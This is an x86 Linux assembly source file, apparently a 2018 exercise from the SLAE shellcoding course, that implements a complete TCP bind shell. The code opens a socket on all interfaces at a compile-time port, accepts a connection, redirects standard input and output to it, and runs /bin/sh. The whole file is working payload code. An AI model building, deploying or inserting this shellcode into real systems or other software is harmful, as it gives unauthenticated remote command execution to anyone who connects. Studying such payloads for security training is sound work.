; bind.nasm - A TCP Bind Shell
; Assignment 1 of SLAE course
; 2018-06-21 Thomas Karpiniec

; Compile with chosen port in network byte order, e.g. 4444:
;     nasm -f elf32 -o bind.o -DLISTEN_PORT=0x5c11 bind.nasm

global _start

       AF_INET		equ 2
       SOCK_STREAM 	equ 1
       SYS_SOCKET 	equ 359
       SYS_BIND 	equ 361
       SYS_LISTEN	equ 363
       SYS_ACCEPT4 	equ 364
       SYS_DUP2 	equ 63
       SYS_EXECVE 	equ 11


_start:
	; Obtain an AF_INET socket
	mov eax, SYS_SOCKET	; syscall
	mov ebx, AF_INET	; domain
	mov ecx, SOCK_STREAM	; type
	mov edx, 0		; protocol = 0
	int 0x80
	mov edi, eax		; Save socket fd in EDI

	; Push struct sockaddr_in backwards onto stack - all interfaces port 4444
	xor eax, eax
	push eax		; 4 bytes zero padding
	push eax	    	; 4 bytes zero padding
	push eax	    	; sin_addr = 0x00000000 = INADDR_ANY
	push word LISTEN_PORT	; sin_port
	push word AF_INET	; sin_family
	
	; Bind interface and port
	mov eax, SYS_BIND	; syscall
	mov ebx, edi		; sockfd = created socket fd
	mov ecx, esp		; esp points to start of sockaddr
	mov edx, 16   		; addrlen = sizeof(struct sockaddr) = 16
	int 0x80

	; Listen for connections
	mov eax, SYS_LISTEN	; syscall
	mov ebx, edi		; sockfd = created socket fd
	mov ecx, 0		; backlog = 0
	int 0x80

	; Accept the first connection that arrives
	; This won't work more than once
	mov eax, SYS_ACCEPT4   ; syscall
	mov ebx, edi	       ; sockfd = created socket fd
	mov ecx, 0	       ; addr
	mov edx, 0	       ; addrlen
	mov esi, 0	       ; flags
	int 0x80
	mov edi, eax	       ; retval is fd for the client connection

	; Redirect STDIN, STDOUT and STDERR to the client socket
	mov eax, SYS_DUP2       ; syscall
	mov ebx, edi		; socket
	mov ecx, 0		; STDIN
	int 0x80

	mov eax, SYS_DUP2	; syscall
	mov ecx, 1		; STDOUT
	int 0x80

	mov eax, SYS_DUP2	; syscall
	mov ecx, 2		; STDERR
	int 0x80

	; Execute /bin/sh, inheriting file descriptors from this process
	; /bin//sh = 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73 0x68
	xor eax,eax
	push eax		; null termination
	push dword 0x68732f2f	; last half of string
	push dword 0x6e69622f	; first half of string = filename
	push eax		; null terminator of array = envp array
	lea ebx, [esp + 4]	; Point to beginning of /bin//sh in ebx
	push ebx      		; After this, esp = start of argv array

	mov eax, SYS_EXECVE	; syscall
	; ebx = filename is already set
	mov ecx, esp	    	; argv
	lea edx, [ecx + 4]	; envp
	int 0x80
	
	
	
	